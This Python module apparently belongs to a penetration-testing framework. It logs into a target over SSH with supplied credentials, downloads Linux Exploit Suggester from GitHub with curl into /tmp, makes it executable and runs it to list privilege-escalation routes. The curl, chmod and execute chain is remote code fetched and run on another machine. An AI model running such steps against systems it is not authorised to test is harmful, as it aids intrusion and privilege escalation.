# /modules/pb_check_kernel_exploits.py
from modules.base import BaseModule
from core.utils.ssh_handler import *
from core.utils.formatter import printc


class Module(BaseModule):
    def __init__(self):
        super().__init__()

        self.name = "pb_check_kernel_exploits"
        self.description = "Run Linux Exploit Suggester 1 or 2 on the target to identify local privilege escalation possibilities."
        self.category = "privilege_escalation"
        self.author = "022NN"
        self.author_email = "n0220n@proton.me"
        self.url = "https://github.com/bkili"
        self.license = ""
        self.version = "0.0.1"

        # Default options for the module
        self.default_options = {
            "rhost": "",
            "rport": "22",
            "username": "",
            "password": "",
        }

        # List of options that are considered required (shown in CLI with 'yes' under Required)
        self.required_options = ["rhost", "username", "password"]

        self.options = self.default_options.copy()

    def requires(self):
        return []

    def run(self, shared_data):
        # Options
        host = self.options.get("rhost").strip()
        port = int(self.options.get("rport"))
        username = self.options.get("username").strip()
        password = self.options.get("password").strip()

        # Create ssh client
        try:
            printc(f"Trying to connect {host}:{port}", level="module")
            ssh = create_ssh_client(host, port, username, password)
        except Exception as e:
            printc(f"Failed to connect : {e}", level="error")
            return

        printc(f"Connected to {host}:{port}", level="success")

        # Check the system for choosing lne version
        printc(f"Checking if there is perl ...", level="module")

        les_url = "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh"
        les2_url = "https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl"
        les = ""
        les_name = ""

        try:
            cmd = "perl -v >/dev/null 2>&1 && echo found || echo notfound"
            _, stdout, stderr = ssh_exec(ssh, cmd)
            stdout_clean = stdout.strip().lower()
            # printc(f"[debug] Output from perl test: '{stdout_clean}'", level="debug")

            if stdout_clean == "found":
                printc(
                    "Perl found in the system, module will use Linux Exploit Suggester 2 (pl)",
                    level="success",
                )
                les = les2_url
                les_name = "linux-exploit-suggester-2.pl"
            else:
                printc(
                    "Perl not found, will use Linux Exploit Suggester (sh)",
                    level="unsuccessful",
                )
                les = les_url
                les_name = "linux-exploit-suggester.sh"

        except Exception as e:
            printc(f"Failed to execute 'which perl' command: {e}", level="error")
            return

        # Download LES to the target
        try:
            # Download proper LES
            printc(f"[*] Downloading {les_name} ...", level="module")
            cmd = f"curl -L {les} -O {les_name}"
            stdin, stdout, stderr = ssh_exec(ssh, cmd)

            # Move LES to the /tmp/ directory
            printc(f"[*] Moving {les_name} to /tmp/{les_name} ...", level="module")
            cmd = f"mv {les_name} /tmp/{les_name}"
            stdin, stdout, stderr = ssh_exec(ssh, cmd)

            # Give permission to run
            printc(f"[*] chmod +x {les_name} ...", level="module")
            cmd = f"chmod +x /tmp/{les_name}"
            stdin, stdout, stderr = ssh_exec(ssh, cmd)

            # Change directory and run the script
            printc(f"[*] Running {les_name} ...", level="module")
            cmd = f"cd /tmp && ./{les_name}"
            _, stdout, stderr = ssh_exec(ssh, cmd)
            printc(stderr, level="error")
            printc(stdout, level="success")

        except Exception as e:
            printc(f"[!] Failed to execute : {e}", level="error")

        ssh.close()

    def print_summary(self, summary):
        try:
            print(f"")
        except Exception as e:
            printc(f"{e}", level="error")
